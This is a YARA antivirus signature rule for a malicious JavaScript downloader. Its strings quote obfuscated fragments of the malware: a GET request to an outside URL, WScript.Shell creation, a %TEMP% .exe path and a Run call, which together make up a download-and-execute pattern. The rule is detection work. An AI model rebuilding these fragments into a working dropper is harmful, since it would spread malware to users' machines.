rule sig_20160330_6778c1cccf7c96ba9b24fb9c91789763 {
  meta:
    description = "datamaliciousorder - file 20160330_6778c1cccf7c96ba9b24fb9c91789763.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d3c86a30144b9bbaa1cf3dab9aa522144ff40c29bb3b9148898fb300659ece8a"

  strings:
    $s1  = "_IW[_UE](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "function _C(_WP, _BZ){_MW = _MW * 1; return _WP - _BZ;};" fullword ascii
    $s3  = "var _ZL = function _B() {return WScript[_U](\"WScript\"+\".Shell\");}(), _W0 = 11;" fullword ascii
    $s4  = "if (_IW[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _VC() {return _ZL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5RZgVkVRuZN2.ex\" + \"e\";};" fullword ascii
    $s6  = "function _BK(){return _E0 + \"\";};" fullword ascii
    $s7  = "function _LY(_IX){_ZL[\"Run\"](_IX, _MW, _MW);};" fullword ascii
    $s8  = "function _M() {return ((_L0 == true) && (_L0 == _JL)) ? 1 : _MW;};" fullword ascii
    $s9  = "var _AG = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_J){" fullword ascii
    $s11 = "function _L(){return _U;};" fullword ascii
    $s12 = "return _C(_Q, _W);" fullword ascii
    $s13 = "function _DF()" fullword ascii
    $s14 = "function _EM(){return 22;};" fullword ascii
    $s15 = "function _JY(_S) {var _E = (1, 2, 3, 4, 5, _S); return _E;};" fullword ascii
    $s16 = "var _L0 = false;" fullword ascii
    $s17 = "_L0 = true; " fullword ascii
    $s18 = "var _BS = false;" fullword ascii
    $s19 = "var _JL = false;" fullword ascii
    $s20 = "_JL = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}